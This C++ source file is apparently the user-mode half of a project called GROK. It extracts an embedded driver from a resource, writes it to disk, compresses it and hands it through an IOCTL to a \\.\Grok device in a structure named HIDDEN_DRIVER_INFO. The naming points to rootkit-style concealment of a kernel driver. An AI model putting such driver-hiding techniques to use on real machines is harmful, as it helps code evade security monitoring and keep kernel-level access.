#include "pch.h"
#include "GROK_Device.h"
#include "GROK_Resource.hpp"


int main()
{
    GROK::HIDDEN_DRIVER_INFO hiddenDriverInfo;

    GROK::Resource grokRsrc { nullptr, GROK::DRIVER_TO_LOAD };
    if (!grokRsrc || 
        !grokRsrc.writeToFile(GROK::Device::DRIVER_PATH))
    {
        WinError(L"GROK::Resource");
        return 0;
    }
    
    auto ntHeaders = RtlImageNtHeader(grokRsrc.getBuffer());
    hiddenDriverInfo.DriverSize = ntHeaders->OptionalHeader.SizeOfImage;
    
    auto grokDriver =
        (uint8_t*)::VirtualAlloc(nullptr,
                                 hiddenDriverInfo.DriverSize,
                                 MEM_COMMIT,
                                 PAGE_READWRITE);

    auto readDriverIntoBuffer = [&grokDriver, hiddenDriverInfo]() 
    {
        auto hFile = ::CreateFileW(GROK::Device::DRIVER_PATH.c_str(),
                                   GENERIC_READ,
                                   FILE_SHARE_READ,
                                   nullptr,
                                   OPEN_EXISTING,
                                   FILE_ATTRIBUTE_NORMAL,
                                   nullptr);

        if (hFile == INVALID_HANDLE_VALUE)
        {
            WinError(L"CreateFile");
            return false;
        }

        DWORD _ {};
        auto bOk = ::ReadFile(hFile, grokDriver, hiddenDriverInfo.DriverSize, &_, nullptr);
        ::CloseHandle(hFile);

        if (!bOk)
        {
            WinError(L"ReadFile");
            return false;
        }
        else
        {
            return true;
        }
    };

    if (!readDriverIntoBuffer()) { return 0; }
    
    hiddenDriverInfo.CompressedDriver = 
        (uint8_t*)::VirtualAlloc(nullptr,
                                 hiddenDriverInfo.DriverSize,
                                 MEM_COMMIT, 
                                 PAGE_READWRITE);

    GROK::Device grok { LR"(\\.\Grok)", GENERIC_READ };
    if (grok)
    {
        if (GROK::CompressBuffer(grokDriver, hiddenDriverInfo))
        {
            if (!grok.ctrlDispatch(GROK::IOCTL::SendCompressBuffer,
                                   &hiddenDriverInfo,
                                   sizeof hiddenDriverInfo))
            {
                WinError(L"GROK::ctrlDispatch");
            }
        }
    }
    
    ::VirtualFree(grokDriver, 0, MEM_RELEASE);
    ::VirtualFree(hiddenDriverInfo.CompressedDriver, 0, MEM_RELEASE);

    return 0;
}

